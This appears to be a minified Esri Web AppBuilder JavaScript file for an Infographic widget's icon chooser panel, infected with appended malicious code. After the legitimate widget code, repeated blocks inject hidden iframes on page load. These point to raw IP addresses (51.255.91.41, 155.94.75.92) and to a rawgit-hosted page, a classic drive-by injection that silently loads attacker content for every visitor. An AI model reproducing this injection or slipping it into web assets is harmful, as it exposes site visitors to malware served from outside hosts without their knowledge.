// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/Infographic/setting/dijitsSetting/_dijits/IconChooserPanel.html":'\x3cdiv\x3e\r\n\t\x3cdiv style\x3d"margin-top: 12px;" class\x3d"title title-box"\x3e${nls.icons}\x3c/div\x3e\r\n\t\x3cdiv style\x3d"margin-top: 14px;" class\x3d"marginLeft30 flex-Ttb"\x3e\r\n\t\t\x3cdiv class\x3d"styleDiv"\x3e\r\n\t\t\t\x3cdiv class\x3d"left-div label style-label"\x3e${nls.style}\x3c/div\x3e\r\n\t\t\t\x3cdiv class\x3d"style-container"\x3e\r\n\t\t\t\t\x3cdiv class\x3d"style-content" data-dojo-attach-point\x3d"iconStyle1"\x3e\x3c/div\x3e\r\n\t\t\t\t\x3cdiv class\x3d"style-content" data-dojo-attach-point\x3d"iconStyle2"\x3e\x3c/div\x3e\r\n\t\t\t\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\r\n\t\t\x3cdiv class\x3d"placement" style\x3d"margin-top:17px;"\x3e\r\n\t\t\t\x3cdiv class\x3d"left-div label placement-label"\x3e${nls.placement}\x3c/div\x3e\r\n\t\t\t\x3cdiv class\x3d"right-div" data-dojo-attach-point\x3d"placement"\x3e\r\n\t\t\t\t\x3cdiv class\x3d"placeDiv text-center left"\x3e${nls.left}\x3c/div\x3e\r\n\t\t\t\t\x3cdiv class\x3d"placeDiv text-center replace mergeBorder"\x3e${nls.replace}\x3c/div\x3e\r\n\t\t\t\x3cdiv class\x3d"placeDiv text-center right mergeBorder"\x3e${nls.right}\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\r\n\t\t\x3cdiv style\x3d"margin-top: 14px;display: flex;"\x3e\r\n\t\t\t\x3cdiv class\x3d"left-div label color-label"\x3e${nls.color}\x3c/div\x3e\r\n\t\t\t\x3cdiv class\x3d"right-div"\x3e\r\n\t\t\t\t\x3cdiv class\x3d"colorPicker" data-dojo-attach-point\x3d"colorPicker"\x3e\x3c/div\x3e\r\n\t\t\t\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\t\x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dijit/_WidgetBase dojo/Evented dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./IconChooserPanel.html jimu/dijit/ColorPickerPopup dojo/_base/Color dijit/TooltipDialog dijit/popup dojo/_base/html dojo/_base/lang dojo/on dojo/query dojo/dom-style".split(" "),function(h,k,l,m,n,q,r,p,t,g,d,b,e,f,u){var v=h([k,m,n,l],{baseClass:"infographic-setting-number-icon-chooser-panel",templateString:q,nls:null,icons:"icon-up-svg icon-down-svg icon-stop-svg icon-star-svg icon-danger-svg icon-alarm-svg icon-right-svg icon-wrong-svg icon-like-svg icon-unlike-svg".split(" "),
iconInfo:null,postCreate:function(){this.inherited(arguments);this.DEFAULT_ICON={color:"#49B4CB",icon:"icon-up",placement:"left"};this.iconInfo=b.mixin(this.DEFAULT_ICON,this.iconInfo);this._init();this.setConfig(this.iconInfo);this._hasLoaded=!0},_init:function(){this._initIcons();this._initColorPicker();this._initEvent()},_initIcons:function(){this.icons.forEach(b.hitch(this,function(a,c){var b=d.toDom('\x3cdiv class\x3d"iconDiv '+a+'"\x3e\x3c/div\x3e');b.icon=a.replace("-svg","");5>c?d.place(b,
this.iconStyle1,"last"):d.place(b,this.iconStyle2,"last")}))},getIconColor:function(){if(this.iconInfo)return this.iconInfo.color},setIconColor:function(a){this.iconColorPicker.setColor(new p(a));this.iconColorPicker.picker.changeColor()},_onIconInfoChanged:function(){if(this._hasLoaded&&this.iconInfo){var a=b.clone(this.iconInfo);this.emit("change",a)}},_initColorPicker:function(){this.iconColorPicker=new r({appearance:{showTransparent:!1,showColorPalette:!0,showCoustom:!0,showCoustomRecord:!0}});
this.iconColorPicker.placeAt(this.colorPicker);this.iconColorPicker.startup();this.own(e(this.iconColorPicker,"change",b.hitch(this,function(a){this.iconInfo.color=a.toHex();this._onIconInfoChanged()})))},_handleStyleClick:function(a){a.stopPropagation();var c;a=a.srcElement||a.target;a.icon?c=a:a.parentElement.icon&&(c=a.parentElement);c&&this._onIconSelected(c)},_initEvent:function(){this.own(e(this.iconStyle1,"click",b.hitch(this,this._handleStyleClick)));this.own(e(this.iconStyle2,"click",b.hitch(this,
this._handleStyleClick)));this.own(e(this.placement,"click",b.hitch(this,function(a){a.stopPropagation();a=a.srcElement||a.target;d.hasClass(a,"placeDiv")&&this._onPlacementSelected(a)})))},setConfig:function(a){a&&(this.iconInfo=a,this.iconInfo.color&&this.iconColorPicker.setColor(new p(this.iconInfo.color)),this.iconInfo.icon&&(a=f(".styleDiv ."+this.iconInfo.icon+"-svg")[0])&&this._onIconSelected(a),this.iconInfo.placement&&(a=f(".placement ."+this.iconInfo.placement)[0])&&this._onPlacementSelected(a))},
getConfig:function(){if(this.iconInfo&&this.iconInfo.icon&&this.iconInfo.placement)return this.iconInfo},_onIconSelected:function(a){f(".styleDiv .iconDiv").removeClass("iconSelected");d.addClass(a,"iconSelected");this.iconInfo.icon=a.icon;this._onIconInfoChanged()},_onPlacementSelected:function(a){var c;d.hasClass(a,"left")?c="left":d.hasClass(a,"replace")?c="replace":d.hasClass(a,"right")&&(c="right");f(".placement .placeDiv").removeClass("placeSelected");d.addClass(a,"placeSelected");this.iconInfo.placement=
c;this._onIconInfoChanged()}});return h([k,m,n,l],{baseClass:"infographic-setting-number-icon-chooser-popup",templateString:'\x3cdiv\x3e\x3cdiv class\x3d"icon" data-dojo-attach-point\x3d"iconPreview"\x3e\x3c/div\x3e\x3cdiv class\x3d"border-merge drop-down-arrow"\x3e\x3c/div\x3e\x3c/div\x3e',_isTooltipDialogOpened:!1,folderUrl:"",postCreate:function(){this.inherited(arguments);this.DEFAULT_ICON={color:"#49B4CB",icon:"icon-up",placement:"left"};this.config=b.mixin(this.DEFAULT_ICON,this.config);this._createTooltipDialog();
this.setConfig(this.config)},setConfig:function(a){if(this.config=a)this.iconChooser.setConfig(this.config),this._previewIcon(this.config)},getConfig:function(){return this.config=this.iconChooser.getConfig()},getIconColor:function(){return this.iconChooser.getIconColor()},setIconColor:function(a){this.iconChooser.setIconColor(a)},_setIconChooserUI:function(){this.getConfig();this.config&&this.iconChooser.setConfig(this.config)},_previewIcon:function(a){d.removeClass(this.iconPreview);d.addClass(this.iconPreview,
["iconPreview","indicator-icon",a.icon]);u.set(this.iconPreview,"color",a.color);this._onUpdate()},_onUpdate:function(){this.emit("change",this.getConfig())},_createTooltipDialog:function(){var a=d.create("div");this.tooltipDialog=new t({content:a});d.addClass(this.tooltipDialog.domNode,"infographic-setting-number-icon-chooser-popup-dialog");this.iconChooser=new v({nls:this.nls,iconInfo:this.config});this.iconChooser.placeAt(a);this.iconChooser.startup();this.own(e(this.domNode,"click",b.hitch(this,
function(a){a.stopPropagation();a.preventDefault();this._isTooltipDialogOpened?this._hideTooltipDialog():this._showTooltipDialog()})));this.own(e(document,"click",b.hitch(this,function(a){this._isPartOfPopup(a.srcElement||a.target)||this._hideTooltipDialog()})));this._initIconChooserEvent()},_initIconChooserEvent:function(){this.own(e(this.iconChooser,"change",b.hitch(this,function(a){this._previewIcon(a)})))},hideTooltipDialog:function(){this._hideTooltipDialog()},_showTooltipDialog:function(){g.open({parent:this.getParent(),
popup:this.tooltipDialog,around:this.domNode});this._isTooltipDialogOpened=!0;this._setIconChooserUI()},_hideTooltipDialog:function(){g.close(this.tooltipDialog);this._isTooltipDialogOpened=!1},destroy:function(){this.iconChooser&&(this.iconChooser.destroy(),this.iconChooser=null);this.tooltipDialog&&(this.tooltipDialog.destroy(),this.tooltipDialog=null);this.inherited(arguments)},_isPartOfPopup:function(a){var c,b,e;c=this.tooltipDialog.domNode;c=a===c||d.isDescendant(a,c);this.iconChooser&&this.iconChooser.iconColorPicker&&
(b=this.iconChooser.iconColorPicker.getTooltipDialog().domNode,b=a===b||d.isDescendant(a,b));var f=g.getTopPopup();f&&f.wrapper&&(e=f.wrapper,e=a===e||d.isDescendant(a,e));return c||b||e}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});